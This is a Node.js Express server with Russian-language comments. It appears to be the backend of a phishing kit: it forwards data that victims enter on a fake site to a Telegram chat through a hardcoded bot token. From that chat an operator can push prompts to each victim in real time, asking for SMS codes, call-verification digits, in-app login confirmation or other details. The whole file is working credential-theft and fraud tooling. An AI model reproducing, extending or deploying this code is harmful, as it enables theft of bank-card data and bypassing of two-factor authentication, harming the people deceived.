const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHAT_ID = '-1003455979409';

// Хранилище команд для пользователей
let userTasks = {}; 

// --- API ДЛЯ САЙТА ---

app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;
    console.log(`[LOG] Данные от ${userId} (${type})`);
    
    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${type}]</b>\n`;
    logMsg += `🆔 ID: <code>${userId}</code>\n`;
    logMsg += `------------------------\n`;
    for (let key in data) {
        logMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "💬 СМС Код", callback_data: `ask_${userId}_Введите код из СМС` },
                        { text: "📞 Звонок4", callback_data: `ask_${userId}_Введите 4 цифры из звонка` }
                    ],
                    [
                        { text: "📲 Пуш", callback_data: `msg_${userId}_Подтвердите вход в приложении` },
                        { text: "💰 Баланс", callback_data: `msg_${userId}_Недостаточно средств на карте.` }
                    ],
                    [
                        { text: "🛠 Поддержка", callback_data: `ask_${userId}_Опишите проблему оператору` },
                        { text: "✍️ Свой текст", callback_data: `ask_${userId}_Введите данные` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        console.error("ОШИБКА TG:", e.message);
        res.status(500).send('TG Error');
    }
});

app.get('/api/check/:userId', (req, res) => {
    const userId = req.params.userId;
    const task = userTasks[userId] || null;
    if (task) {
        console.log(`[CHECK] Команда для ${userId}:`, task.action);
        delete userTasks[userId]; 
    }
    res.json(task);
});

// --- API ДЛЯ ТЕЛЕГРАМА (WEBHOOK) ---

app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    if (callback_query) {
        const parts = callback_query.data.split('_');
        const action = parts[0]; 
        const userId = parts[1];
        const text = parts.slice(2).join('_'); // Берем весь остаток как текст

        userTasks[userId] = { action, text };

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callback_query.id,
            text: "✅ Отправлено!"
        });
    }

    if (message && message.text && message.text.startsWith('/send')) {
        const parts = message.text.split(' ');
        const userId = parts[1];
        const text = parts.slice(2).join(' ');

        if (userId && text) {
            userTasks[userId] = { action: 'msg', text: text };
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Отправлено пользователю ${userId}`
            });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
